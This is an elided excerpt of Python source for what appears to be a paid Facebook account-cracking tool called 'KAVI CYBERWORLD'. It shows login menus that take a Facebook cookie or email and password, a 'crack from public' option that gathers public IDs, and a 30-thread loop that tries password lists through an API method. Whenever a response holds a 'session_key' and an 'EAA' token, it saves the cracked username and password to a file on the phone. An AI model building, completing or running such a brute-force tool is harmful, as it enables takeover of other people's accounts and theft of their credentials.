...
class Logo:
	...
	def logonya(self):
		...
		prints(Panel(f"""                                                                      
 _______     ________  ______      ________  ____  ____  ________  
|_   __ \   |_   __  ||_   _ `.   |_   __  ||_  _||_  _||_   __  | 
  | |__) |    | |_ \_|  | | `. \    | |_ \_|  \ \  / /    | |_ \_| 
  |  __ /     |  _| _   | |  | |    |  _| _    \ \/ /     |  _| _  
 _| |  \ \_  _| |__/ | _| |_.' /   _| |__/ |   _|  |_    _| |__/ | 
|____| |___||________||______.'   |________|  |______|  |________| 
                                                                   


                 WELCOME :  KAVI CYBERWORLD
                 TOOL OWNER : KAVI
                 VERSION  : 0.1
                 STATUS : PAID 

                \033[38;5;46mHELLO WELCOME  ENJOY
                                     
                                                               
MEMBER OF  BHH FAMILY
...
class Login:
	...
	def menu_login(self):
		...
		prints(Panel(f"""{P2}[{color_text}01{H2}].LOGIN FACEBOOK COOKIE
[{color_text}02{H2}]. LOGIN WITH EMAIL && PASS""",width=80,padding=(0,15),style=f"{color_panel}"))
		login = console.input(f" {H2}• {P2}CHOOSE : ")
		if login in["1","01"]:
			prints(Panel(f"""NOTE : USE FRESH COOKIE """,width=80,style=f"{color_panel}"))
...
class Menu:
	...
	def menu(self):
		...
		prints(Panel(f"""{H2}  01) CRACK FROM PUBLIC      {H2} 02)TYPE back """,width=80,padding=(0,7),style=f"{color_panel}"))
		prints(Panel(f"""{H2} NOTE {H2} TYPE {H2} BACK {H2} FOR {H2} MAIN MENU""",width=80,padding=(0,6),style=f"{color_panel}"))
		menu = console.input(f" {H2}• {P2}CHOOSE : ")
		
		###----------[ ID PUBLIK ]---------- ###
		if menu in["1","01"]:
			prints(Panel(f"""{P2}NOTE : USE PUBLIC ID ONLY""",subtitle=f"{P2}ENTER{P2} YOUR{P2} ID BELOW ",width=80,style=f"{color_panel}"))
...
class Crack:
	...
	def manual(self,pw):
		...
		prints(Panel(f"""{H2} CRACK FINISHED TOTAL {len(tampung)} ID, ENJOY OK : {H2}{len(self.ok)}{P2} CP : {K2}{len(self.cp)}{P2}""",width=80,padding=(0,8),style=f"{color_panel}"))
		sys.exit()
			...
			with ThreadPoolExecutor(max_workers=30) as fall:
				...
				for data in tampung:
					try:
						...
						fall.submit(self.metode_api,user,pwx)
		prints(Panel(f"""{P2} CRACK FINISHED  {len(tampung)} id, ENJOY OK : {H2}{len(self.ok)}{P2} CP : {K2}{len(self.cp)}{P2}""",width=80,padding=(0,8),style=f"{color_panel}"))
		sys.exit()
							
	###----------[ METODE API ]---------- ###
	def metode_api(self,user,pwx):
		prog.update(des,description=f"{H2}[KAVI❤]{P2} {str(self.loop)}/{len(tampung)} OK : {H2}{len(self.ok)}{P2} CP : {P2}{len(self.cp)}{P2}")
		prog.advance(des)
		try:
			for pw in pwx:
				pw = pw.lower()
				...
				if "session_key" in post.text and "EAA" in post.text:
					...
					tree = Tree("                            ")
					tree.add(f" BHH💙 OK {H2}{user}|{pw}{P2} ")
					
					prints(tree)
					open('/sdcard/BHH-OK.txt','a').write(f"KAVI OK❤️ | {user} |{pw}|\n")
					break
	...
	def simpan_hasil(self):
		prints(Panel(f"""{P2}KAVI CRACK OK DATE : OK/{self.hari_ini}.txt
{P2}KAVI CRACK CP DATE : CP/{self.hari_ini}.txt""",width=80,padding=(0,10),style=f"{color_panel}"))
...
class Back:
	...
	###----------[ MENU ]---------- ###
	def menu(self):
		prints(Panel(f"""{P2}[{color_text}01.Logout
